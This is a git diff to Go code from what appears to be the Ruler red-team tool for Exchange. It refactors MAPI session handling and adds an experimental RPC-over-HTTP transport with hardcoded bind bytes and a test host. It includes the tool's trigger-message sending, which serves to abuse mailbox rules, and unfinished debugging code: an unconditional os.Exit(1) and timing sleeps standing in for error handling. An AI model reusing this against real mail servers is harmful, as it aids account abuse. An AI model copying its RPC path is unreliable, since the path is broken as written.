@@ -7,7 +7,9 @@ import (
 	"net/http"
 	"net/http/cookiejar"
 	"net/url"
+	"os"
 	"regexp"
+	"time"
 
 	"github.com/sensepost/ruler/http-ntlm"
 	"github.com/sensepost/ruler/rpc-http"
@@ -21,7 +23,7 @@ const HTTP int = 1
 const RPC int = 2
 
 //AuthSession a
-var AuthSession utils.Session
+var AuthSession *utils.Session
 
 //ExtractMapiURL extract the External mapi url from the autodiscover response
 func ExtractMapiURL(resp *utils.AutodiscoverResp) string {
@@ -44,11 +46,8 @@ func ExtractRPCURL(resp *utils.AutodiscoverResp) string {
 }
 
 //Init is used to start our mapi session
-func Init(config utils.Config, lid, URL, ABKURL string, transport int) {
-	AuthSession.User = config.User
-	AuthSession.Pass = config.Pass
-	AuthSession.Email = config.Email
-	AuthSession.Insecure = config.Insecure
+func Init(config *utils.Session, lid, URL, ABKURL string, transport int) {
+	AuthSession = config
 	AuthSession.LID = lid
 	AuthSession.CookieJar, _ = cookiejar.New(nil)
 	if transport == HTTP {
@@ -62,7 +61,6 @@ func Init(config utils.Config, lid, URL, ABKURL string, transport int) {
 	AuthSession.ReqCounter = 1
 	AuthSession.LogonID = 0x05
 	AuthSession.Authenticated = false
-	AuthSession.Admin = config.Admin
 }
 
 func addMapiHeaders(req *http.Request, mapiType string) {
@@ -84,10 +82,17 @@ func addRPCHeaders(req *http.Request) {
 
 }
 
+func sendMapiRequest(mapiType string, mapi []byte) ([]byte, error) {
+	if AuthSession.Transport == HTTP {
+		return mapiRequestHTTP(AuthSession.URL.String(), mapiType, mapi)
+	}
+	return mapiRequestRPC(mapi)
+}
+
 //mapiAuthRequest connects and authenticates using NTLM or basic auth.
 //After the authentication is complete, we can simply use the mapiRequest
 //and the session cookies.
-func mapiRequestHTTP(URL, mapiType string, body []byte) (*http.Response, []byte) {
+func mapiRequestHTTP(URL, mapiType string, body []byte) ([]byte, error) {
 	if AuthSession.ClientSet == false {
 		AuthSession.Client = http.Client{
 			Transport: &httpntlm.NtlmTransport{
@@ -122,26 +127,41 @@ func mapiRequestHTTP(URL, mapiType string, body []byte) (*http.Response, []byte)
 		fmt.Println(err)
 		return nil, nil
 	}
-	return resp, rbody
+	responseBody, err := readResponse(resp.Header, rbody)
+	return responseBody, err
 }
 
 //mapiRequestRPC to our target. Takes the mapiType (Connect, Execute) to determine the
 //action performed on the server side
-func mapiRequestRPC(body []byte) (*http.Response, []byte) {
+func mapiRequestRPC(body []byte) ([]byte, error) {
 	var URL = "http://mail.evilcorp.ninja/rpc/rpcproxy.dll?7bb476d4-8e1f-4a57-bbd8-beac7912fb77@evilcorp.ninja:6001"
 	if AuthSession.RPCSet == false {
-		var err error
-		rpchttp.AuthSession = &AuthSession
-		if err = rpchttp.RPCOpen(rpchttp.RPCIN, URL); err != nil {
-			return nil, nil
-		}
-		if err = rpchttp.RPCOpen(rpchttp.RPCOUT, URL); err != nil {
-			return nil, nil
-		}
-		rpchttp.RPCAuth()
+		//	var err error
+		rpchttp.AuthSession = AuthSession
+
+		go rpchttp.RPCOpen(URL)
+		time.Sleep(time.Second * 2)
+		//Send our bind to RPC_IN_DATA
+		dataout := []byte{0x05, 0x00, 0x14, 0x03, 0x10, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x06, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0xc3, 0x12, 0x4b, 0x45, 0xcb, 0x73, 0x07, 0xae, 0x45, 0xb3, 0xa1, 0x52, 0x91, 0x3b, 0x23, 0x28, 0x03, 0x00, 0x00, 0x00, 0x92, 0x35, 0x9d, 0xcd, 0x87, 0x61, 0x29, 0x45, 0xe1, 0x45, 0x40, 0xfc, 0x81, 0x8c, 0x89, 0x9d, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x05, 0x00, 0x00, 0x00, 0xe0, 0x93, 0x04, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x7b, 0xe5, 0xd2, 0xec, 0xff, 0x70, 0xc2, 0x40, 0x91, 0xb7, 0x8a, 0x4f, 0x72, 0x38, 0x39, 0x1d}
+		rpchttp.RPCWrite(dataout)
+
+		//Send our Bind to RPC_OUT_DATA
+		dataout = []byte{0x05, 0x00, 0x14, 0x03, 0x10, 0x00, 0x00, 0x00, 0x4c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x06, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0xc3, 0x12, 0x4b, 0x45, 0xcb, 0x73, 0x07, 0xae, 0x45, 0xb3, 0xa1, 0x52, 0x91, 0x3b, 0x23, 0x28, 0x03, 0x00, 0x00, 0x00, 0xc6, 0x82, 0x92, 0x1c, 0xe8, 0xf2, 0x16, 0xd2, 0x7a, 0x04, 0x4b, 0xd1, 0x00, 0xcf, 0x8a, 0x49, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00}
+		rpchttp.RPCOutWrite(dataout)
+
+		dataout = []byte{0x05, 0x00, 0x0b, 0x13, 0x10, 0x00, 0x00, 0x00, 0x74, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0xf8, 0x0f, 0xf8, 0x0f, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0xdb, 0xf1, 0xa4, 0x47, 0xca, 0x67, 0x10, 0xb3, 0x1f, 0x00, 0xdd, 0x01, 0x06, 0x62, 0xda, 0x00, 0x00, 0x51, 0x00, 0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0xdb, 0xf1, 0xa4, 0x47, 0xca, 0x67, 0x10, 0xb3, 0x1f, 0x00, 0xdd, 0x01, 0x06, 0x62, 0xda, 0x00, 0x00, 0x51, 0x00, 0x2c, 0x1c, 0xb7, 0x6c, 0x12, 0x98, 0x40, 0x45, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00}
+		rpchttp.RPCWrite(dataout)
+		time.Sleep(time.Second * 2)
+
+		rpchttp.RPCWrite([]byte{0x05, 0x00, 0x14, 0x03, 0x10, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x01, 0x00, 0x05, 0x00, 0x00, 0x00, 0x30, 0x75, 0x00, 0x00})
+		//time.Sleep(time.Second * 10)
 		AuthSession.RPCSet = true
 	}
-	return nil, nil
+	fmt.Printf("\n\n%x\n\n", body)
+	resp, err := rpchttp.RPCRequest(body)
+
+	os.Exit(1)
+	return resp, err
 }
 
 //isAuthenticated checks if we have a session
@@ -192,31 +212,31 @@ func Authenticate() (*RopLogonResponse, error) {
 	} else {
 		connRequest.Flags = uFlagsUser
 	}
-	connRequest.DefaultCodePage = 1252
-	connRequest.LcidSort = 2057
-	connRequest.LcidString = 1033
-
-	if AuthSession.Transport == HTTP {
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Connect", connRequest.Marshal())
-
-		responseBody, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		connResponse := ConnectResponse{}
-		connResponse.Unmarshal(responseBody)
-
-		if connResponse.StatusCode == 0 {
-			fmt.Println("[+] User DN: ", string(connRequest.UserDN))
-			fmt.Println("[*] Got Context, Doing ROPLogin")
-
-			AuthSession.UserDN = connRequest.UserDN
-			return AuthenticateFetchMailbox(connRequest.UserDN)
-		}
-		return nil, fmt.Errorf("[x]Authentication failed with non-zero status code")
-	} else if AuthSession.Transport == RPC {
-		mapiRequestRPC(connRequest.Marshal())
+	if AuthSession.Transport == RPC {
+		connRequest.DNHash = []byte{0x00, 0x32, 0x02, 0x03, 0x77, 0x00, 0x00, 0x00, 0x00}
 	}
+	connRequest.DefaultCodePage = 1252
+	connRequest.LcidSort = 1033
+	connRequest.LcidString = 2057
+	if AuthSession.Transport == RPC {
+		connRequest.RPCStuff = []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x01, 0x00, 0x0f, 0x03, 0x13, 0xe8, 0x03, 0x00, 0x00, 0x00, 0x00, 0xc6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0xbe, 0x00, 0xbe, 0x00, 0x36, 0x00, 0x01, 0x02, 0xa0, 0x86, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x45, 0x00, 0x74, 0x00, 0x68, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6e, 0x00, 0x65, 0x00, 0x74, 0x00, 0x20, 0x00, 0x32, 0x00, 0x00, 0x00, 0x18, 0x00, 0x01, 0x18, 0x01, 0x00, 0x00, 0x00, 0x78, 0x39, 0x37, 0x11, 0x45, 0x26, 0x06, 0x47, 0xad, 0x40, 0x54, 0x9b, 0x14, 0x89, 0x66, 0x9f, 0x1c, 0x00, 0x02, 0x04, 0x01, 0x00, 0x00, 0x00, 0x74, 0x86, 0x5b, 0x97, 0xaa, 0x85, 0xc3, 0x45, 0x92, 0xd0, 0x57, 0x20, 0xc6, 0xed, 0x8a, 0x9b, 0x1b, 0x00, 0x00, 0x00, 0x34, 0x00, 0x02, 0x0b, 0x01, 0x00, 0x00, 0x00, 0x85, 0x25, 0x4b, 0xf3, 0xd7, 0x37, 0xad, 0x42, 0x9d, 0x28, 0xe1, 0xda, 0xb6, 0xce, 0x02, 0x18, 0x1c, 0x00, 0x00, 0x00, 0x4f, 0x00, 0x55, 0x00, 0x54, 0x00, 0x4c, 0x00, 0x4f, 0x00, 0x4f, 0x00, 0x4b, 0x00, 0x2e, 0x00, 0x45, 0x00, 0x58, 0x00, 0x45, 0x00, 0x00, 0x00, 0x20, 0x00, 0x01, 0x4a, 0xa9, 0x9a, 0x59, 0xd0, 0x01, 0x87, 0xfc, 0x4c, 0xb8, 0x78, 0x6f, 0x26, 0x9c, 0x0f, 0x41, 0xd4, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xc6, 0x00, 0x00, 0x00, 0x08, 0x10, 0x00, 0x00}
+	}
+	responseBody, err := sendMapiRequest("Connect", connRequest.Marshal())
+
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+	}
+	connResponse := ConnectResponse{}
+	connResponse.Unmarshal(responseBody)
+
+	if connResponse.StatusCode == 0 {
+		fmt.Println("[+] User DN: ", string(connRequest.UserDN))
+		fmt.Println("[*] Got Context, Doing ROPLogin")
+
+		AuthSession.UserDN = connRequest.UserDN
+		return AuthenticateFetchMailbox(connRequest.UserDN)
+	}
+
 	return nil, fmt.Errorf("[x] An Unspecified error occurred")
 }
 
@@ -234,33 +254,32 @@ func AuthenticateFetchMailbox(essdn []byte) (*RopLogonResponse, error) {
 	} else {
 		logonBody.OpenFlags = UserPerMdbReplidMapping | HomeLogon | TakeOwnership //[]byte{0x0C, 0x04, 0x00, 0x21}
 	}
-	logonBody.StoreState = 0x00000000
+	logonBody.StoreState = 0
+	fmt.Printf("%x\n", essdn)
 	logonBody.Essdn = essdn
 	logonBody.EssdnSize = uint16(len(logonBody.Essdn))
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0xFF, 0xFF, 0xFF, 0xFF}
 	execRequest.RopBuffer.ROP.RopsList = logonBody.Marshal()
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
-		if execResponse.ErrorCode == 0 && len(execResponse.RopBuffer) > 0 {
-			AuthSession.Authenticated = true
-
-			logonResponse := RopLogonResponse{}
-			logonResponse.Unmarshal(execResponse.RopBuffer)
-			specialFolders(logonResponse.FolderIds)
-			return &logonResponse, nil
-		}
-		if AuthSession.Admin {
-			return nil, fmt.Errorf("[x] Invalid logon. Admin privileges requested but user is not admin")
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+	if execResponse.ErrorCode == 0 && len(execResponse.RopBuffer) > 0 {
+		AuthSession.Authenticated = true
+
+		logonResponse := RopLogonResponse{}
+		logonResponse.Unmarshal(execResponse.RopBuffer)
+		specialFolders(logonResponse.FolderIds)
+		return &logonResponse, nil
+	}
+	if AuthSession.Admin {
+		return nil, fmt.Errorf("[x] Invalid logon. Admin privileges requested but user is not admin")
+	}
+
 	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
 }
 
@@ -273,13 +292,12 @@ func Disconnect() (int, error) {
 	disconnectBody := DisconnectRequest{}
 	disconnectBody.AuxilliaryBufSize = 0
 
-	if AuthSession.Transport == HTTP {
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Disconnect", disconnectBody.Marshal())
-		_, err := readResponse(resp.Header, rbody)
-		if err != nil {
-			return -1, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
+	_, err := sendMapiRequest("Disconnect", disconnectBody.Marshal())
+
+	if err != nil {
+		return -1, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+
 	return 0, nil
 }
 
@@ -291,25 +309,24 @@ func ReleaseObject(inputHandle byte) (*RopReleaseResponse, error) {
 	fullReq := ropRelease.Marshal()
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF}
 	execRequest.RopBuffer.ROP.RopsList = fullReq
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
 
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if execResponse.ErrorCode == 0 {
-			ropReleaseResponse := RopReleaseResponse{}
-			_, err = ropReleaseResponse.Unmarshal(execResponse.RopBuffer[10:])
-			if err != nil {
-				return nil, err
-			}
-			return &ropReleaseResponse, nil
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		ropReleaseResponse := RopReleaseResponse{}
+		_, err = ropReleaseResponse.Unmarshal(execResponse.RopBuffer[10:])
+		if err != nil {
+			return nil, err
+		}
+		return &ropReleaseResponse, nil
+	}
+
 	return nil, fmt.Errorf("[x] Unknown error occurred or empty response")
 }
 
@@ -334,20 +351,20 @@ func SendMessage(triggerWord string) (*RopSubmitMessageResponse, error) {
 	setProperties.PropertValueCount = 8
 
 	propertyTags := make([]TaggedPropertyValue, setProperties.PropertValueCount)
-	propertyTags[0] = TaggedPropertyValue{PidTagBody, UniString("This is the body.\n\r")}
-	propertyTags[1] = TaggedPropertyValue{PropertyTag{PtypString, 0x001A}, UniString("IPM.Note")}
+	propertyTags[0] = TaggedPropertyValue{PidTagBody, utils.UniString("This is the body.\n\r")}
+	propertyTags[1] = TaggedPropertyValue{PropertyTag{PtypString, 0x001A}, utils.UniString("IPM.Note")}
 	propertyTags[2] = TaggedPropertyValue{PidTagMessageFlags, []byte{0x00, 0x00, 0x00, 0x08}} //unsent
-	propertyTags[3] = TaggedPropertyValue{PidTagConversationTopic, UniString(triggerWord)}
+	propertyTags[3] = TaggedPropertyValue{PidTagConversationTopic, utils.UniString(triggerWord)}
 	propertyTags[4] = PidTagIconIndex
 	propertyTags[5] = PidTagMessageEditorFormat
 	propertyTags[5] = TaggedPropertyValue{PidTagNativeBody, []byte{0x00, 0x00, 0x00, 0x01}}
-	propertyTags[6] = TaggedPropertyValue{PidTagSubject, UniString(triggerWord)}
-	propertyTags[7] = TaggedPropertyValue{PidTagNormalizedSubject, UniString(triggerWord)}
+	propertyTags[6] = TaggedPropertyValue{PidTagSubject, utils.UniString(triggerWord)}
+	propertyTags[7] = TaggedPropertyValue{PidTagNormalizedSubject, utils.UniString(triggerWord)}
 
 	setProperties.PropertyValues = propertyTags
 	propertySize := 0
 	for _, p := range propertyTags {
-		propertySize += len(BodyToBytes(p))
+		propertySize += len(utils.BodyToBytes(p))
 	}
 
 	setProperties.PropertValueSize = uint16(propertySize + 2)
@@ -376,9 +393,9 @@ func SendMessage(triggerWord string) (*RopSubmitMessageResponse, error) {
 	modRecipients.RecipientRows[0].RecipientRow.RecipientFlags = 0x0008 | 0x0003 | 0x0200 | 0x0010 | 0x3 | 0x0020 //| 0x0040 //| 0x0010 // | (0x1) | 0x0400 | 0x0200 //0x0651 //0x0040 | 0x0010 | 0x1007 | 0x0400 | 0x0100 //email address and display name
 	//modRecipients.RecipientRows[0].RecipientRow.AddressPrefixUsed = 0x5A
 	//modRecipients.RecipientRows[0].RecipientRow.DisplayType = 0x00
-	modRecipients.RecipientRows[0].RecipientRow.EmailAddress = UniString(AuthSession.Email) //email address and display name
-	modRecipients.RecipientRows[0].RecipientRow.DisplayName = UniString("Self")             //email address and display name
-	modRecipients.RecipientRows[0].RecipientRow.SimpleDisplayName = UniString("Self")       //email address and display name
+	modRecipients.RecipientRows[0].RecipientRow.EmailAddress = utils.UniString(AuthSession.Email) //email address and display name
+	modRecipients.RecipientRows[0].RecipientRow.DisplayName = utils.UniString("Self")             //email address and display name
+	modRecipients.RecipientRows[0].RecipientRow.SimpleDisplayName = utils.UniString("Self")       //email address and display name
 	modRecipients.RecipientRows[0].RecipientRow.RecipientColumnCount = modRecipients.ColumnCount
 
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties = StandardPropertyRow{Flag: 0x00}
@@ -386,14 +403,14 @@ func SendMessage(triggerWord string) (*RopSubmitMessageResponse, error) {
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray = make([][]byte, modRecipients.RecipientRows[0].RecipientRow.RecipientColumnCount)
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[0] = []byte{0x06, 0x00, 0x00, 0x00}
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[1] = []byte{0x00, 0x00, 0x00, 0x00}
-	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[2] = UniString(AuthSession.Email)
+	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[2] = utils.UniString(AuthSession.Email)
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[3] = []byte{0x00, 0x00, 0x00, 0x00}
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[4] = []byte{0x00, 0x00, 0x00, 0x40}
-	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[5] = UniString("Self")
+	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[5] = utils.UniString("Self")
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[6] = []byte{0x01, 0x00, 0x00, 0x00}
 	modRecipients.RecipientRows[0].RecipientRow.RecipientProperties.ValueArray[7] = []byte{0x00, 0x00, 0x00, 0x00}
 
-	modRecipients.RecipientRows[0].RecipientRowSize = uint16(len(BodyToBytes(modRecipients.RecipientRows[0].RecipientRow)))
+	modRecipients.RecipientRows[0].RecipientRowSize = uint16(len(utils.BodyToBytes(modRecipients.RecipientRows[0].RecipientRow)))
 	fullReq = append(fullReq, modRecipients.Marshal()...)
 
 	//submitMessage := RopSubmitMessageRequest{RopID: 0x32, LogonID: AuthSession.LogonID, InputHandle: 0x02, SubmitFlags: 0x00}
@@ -404,50 +421,47 @@ func SendMessage(triggerWord string) (*RopSubmitMessageResponse, error) {
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 	execRequest.RopBuffer.ROP.RopsList = fullReq
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+
+		bufPtr := 10
+
+		createMessageResponse := RopCreateMessageResponse{}
+
+		p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if e != nil {
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
+		}
+		bufPtr += p
+
+		propertiesResponse := RopSetPropertiesResponse{}
+		p, e = propertiesResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if e != nil {
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
+		}
+
+		bufPtr += p
+		modRecipients := RopModifyRecipientsResponse{}
+		p, e = modRecipients.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		bufPtr += p
+		if e != nil {
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
+		}
+
+		submitMessageResp := RopSubmitMessageResponse{}
+		_, err = submitMessageResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
 		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
 		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
 
-		if execResponse.ErrorCode == 0 {
-
-			bufPtr := 10
-
-			createMessageResponse := RopCreateMessageResponse{}
-
-			p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if e != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-			bufPtr += p
-
-			propertiesResponse := RopSetPropertiesResponse{}
-			p, e = propertiesResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if e != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-
-			bufPtr += p
-			modRecipients := RopModifyRecipientsResponse{}
-			p, e = modRecipients.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			bufPtr += p
-			if e != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-
-			submitMessageResp := RopSubmitMessageResponse{}
-			_, err = submitMessageResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if err != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-
-			return &submitMessageResp, nil
-		}
+		return &submitMessageResp, nil
 	}
 
 	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
@@ -480,28 +494,26 @@ func SetMessageStatus(folderid, messageid []byte) (*RopSetMessageStatusResponse,
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 	execRequest.RopBuffer.ROP.RopsList = fullReq
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
-		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
-		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
-
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-
-			setStatusResp := RopSetMessageStatusResponse{}
-
-			_, e := setStatusResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if e != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-			return &setStatusResp, nil
-		}
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
 	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+
+		setStatusResp := RopSetMessageStatusResponse{}
+
+		_, e := setStatusResp.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if e != nil {
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
+		}
+		return &setStatusResp, nil
+	}
+
 	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
 
 }
@@ -529,7 +541,7 @@ func CreateMessage(folderID []byte, properties []TaggedPropertyValue) (*RopSaveC
 	setProperties.PropertyValues = propertyTags
 	propertySize := 0
 	for _, p := range propertyTags {
-		propertySize += len(BodyToBytes(p))
+		propertySize += len(utils.BodyToBytes(p))
 	}
 
 	setProperties.PropertValueSize = uint16(propertySize + 2)
@@ -549,45 +561,40 @@ func CreateMessage(folderID []byte, properties []TaggedPropertyValue) (*RopSaveC
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 	execRequest.RopBuffer.ROP.RopsList = fullReq
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
+
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+
+		createMessageResponse := RopCreateMessageResponse{}
+
+		p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if e != nil {
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
+		}
+		bufPtr += p
+
+		propertiesResponse := RopSetPropertiesResponse{}
+		p, e = propertiesResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
+		if e != nil {
+			return nil, fmt.Errorf("[x]An error occurred %s\n", e)
+		}
+
+		bufPtr += p
+
+		saveMessageResponse := RopSaveChangesMessageResponse{}
+		saveMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
 
 		if err != nil {
-			return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+			return nil, err
 		}
-		execResponse := ExecuteResponse{}
-		execResponse.Unmarshal(responseBody)
-
-		if execResponse.ErrorCode == 0 {
-			bufPtr := 10
-
-			createMessageResponse := RopCreateMessageResponse{}
-
-			p, e := createMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if e != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-			bufPtr += p
-
-			propertiesResponse := RopSetPropertiesResponse{}
-			p, e = propertiesResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
-			if e != nil {
-				return nil, fmt.Errorf("[x]An error occurred %s\n", e)
-			}
-
-			bufPtr += p
-
-			saveMessageResponse := RopSaveChangesMessageResponse{}
-			saveMessageResponse.Unmarshal(execResponse.RopBuffer[bufPtr:])
-
-			if err != nil {
-				return nil, err
-			}
-			return &saveMessageResponse, nil
-		}
-
-		fmt.Println(string(responseBody))
+		return &saveMessageResponse, nil
 	}
 
 	return nil, fmt.Errorf("[x]Unspecified error occurred\n")
@@ -621,34 +628,30 @@ func DeleteMessages(folderid []byte, messageIDCount int, messageIDs []byte) (*Ro
 	execRequest.RopBuffer.ROP.ServerObjectHandleTable = []byte{0x00, 0x00, 0x00, AuthSession.LogonID, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}
 	execRequest.RopBuffer.ROP.RopsList = fullReq
 
-	if AuthSession.Transport == HTTP { // HTTP
-		resp, rbody := mapiRequestHTTP(AuthSession.URL.String(), "Execute", execRequest.Marshal())
-		responseBody, err := readResponse(resp.Header, rbody)
+	responseBody, err := sendMapiRequest("Execute", execRequest.Marshal())
 
+	if err != nil {
+		return nil, fmt.Errorf("[x] A HTTP server side error occurred.\n %s", err)
+	}
+	execResponse := ExecuteResponse{}
+	execResponse.Unmarshal(responseBody)
+
+	if execResponse.ErrorCode == 0 {
+		bufPtr := 10
+		openFolder := RopOpenFolderResponse{}
+		p, err := openFolder.Unmarshal(execResponse.RopBuffer[bufPtr:])
 		if err != nil {
